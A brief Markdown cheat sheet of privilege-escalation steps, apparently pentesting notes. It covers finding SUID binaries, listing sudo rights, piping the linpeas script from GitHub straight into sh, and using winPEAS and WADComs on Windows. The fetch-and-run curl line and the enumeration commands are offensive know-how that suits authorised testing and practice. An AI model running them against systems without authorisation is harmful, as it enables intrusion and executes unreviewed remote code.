# Linux - GTFOBins
## [https://gtfobins.github.io/gtfobins/bash/#sudo] GTFOBins
### finding binaries with SUID
```bash
find / -perm /4000 2> /dev/null
```

### finding sudo commands
```bash
sudo -l
```

### lastly, use linpeas so it can find every other attack vector for you
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

# Windows - WADComs
## [https://wadcoms.github.io/#] WADComs
### use winpeas
[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS] winpeas download

### use WADComs to exploit whatever winpeas found
